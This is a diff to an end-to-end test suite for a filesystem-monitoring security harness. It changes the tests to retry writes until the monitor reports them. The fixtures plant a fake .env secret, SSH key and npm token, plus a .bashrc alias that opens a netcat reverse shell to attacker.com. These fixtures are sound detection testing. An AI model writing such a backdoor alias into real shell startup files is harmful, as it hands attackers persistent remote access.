@@ -10,6 +10,7 @@ import * as fs from 'fs';
 import * as path from 'path';
 import * as os from 'os';
 import { ArpWrapper } from '../../../src/oasb/harness/arp-wrapper';
+import { writeUntilDetected } from '../../helpers/write-until-detected';
 
 describe('E2E-001: Live Filesystem Detection', () => {
   let arp: ArpWrapper;
@@ -43,14 +44,13 @@ describe('E2E-001: Live Filesystem Detection', () => {
   });
 
   it('should detect creation of a .env file as a sensitive path violation', async () => {
-    // Write a real .env file to the watched directory
+    // Write a real .env file to the watched directory, again if the
+    // filesystem monitor does not report it (see writeUntilDetected)
     const envPath = path.join(watchDir, '.env');
-    fs.writeFileSync(envPath, 'SECRET_KEY=test123\n');
-
-    // Wait for the filesystem monitor to pick it up
-    const event = await arp.waitForEvent(
+    const event = await writeUntilDetected(
+      arp,
+      () => fs.writeFileSync(envPath, 'SECRET_KEY=test123\n'),
       (e) => e.source === 'filesystem' && e.data.sensitive === true,
-      5000,
     );
 
     expect(event).toBeDefined();
@@ -64,12 +64,13 @@ describe('E2E-001: Live Filesystem Detection', () => {
   it('should detect creation of a .ssh directory file as sensitive', async () => {
     // Create a .ssh subdirectory and a key file
     const sshDir = path.join(watchDir, '.ssh');
-    fs.mkdirSync(sshDir, { recursive: true });
-    fs.writeFileSync(path.join(sshDir, 'id_rsa'), 'fake-private-key\n');
-
-    const event = await arp.waitForEvent(
+    const event = await writeUntilDetected(
+      arp,
+      () => {
+        fs.mkdirSync(sshDir, { recursive: true });
+        fs.writeFileSync(path.join(sshDir, 'id_rsa'), 'fake-private-key\n');
+      },
       (e) => e.source === 'filesystem' && String(e.data.path).includes('.ssh'),
-      5000,
     );
 
     expect(event).toBeDefined();
@@ -80,11 +81,10 @@ describe('E2E-001: Live Filesystem Detection', () => {
 
   it('should detect .bashrc write as persistence attempt', async () => {
     const bashrcPath = path.join(watchDir, '.bashrc');
-    fs.writeFileSync(bashrcPath, 'alias backdoor="nc -e /bin/sh attacker.com 4444"\n');
-
-    const event = await arp.waitForEvent(
+    const event = await writeUntilDetected(
+      arp,
+      () => fs.writeFileSync(bashrcPath, 'alias backdoor="nc -e /bin/sh attacker.com 4444"\n'),
       (e) => e.source === 'filesystem' && String(e.data.path).includes('.bashrc'),
-      5000,
     );
 
     expect(event).toBeDefined();
@@ -94,11 +94,10 @@ describe('E2E-001: Live Filesystem Detection', () => {
 
   it('should detect .npmrc credential file access', async () => {
     const npmrcPath = path.join(watchDir, '.npmrc');
-    fs.writeFileSync(npmrcPath, '//registry.npmjs.org/:_authToken=npm_FAKE\n');
-
-    const event = await arp.waitForEvent(
+    const event = await writeUntilDetected(
+      arp,
+      () => fs.writeFileSync(npmrcPath, '//registry.npmjs.org/:_authToken=npm_FAKE\n'),
       (e) => e.source === 'filesystem' && String(e.data.path).includes('.npmrc'),
-      5000,
     );
 
     expect(event).toBeDefined();
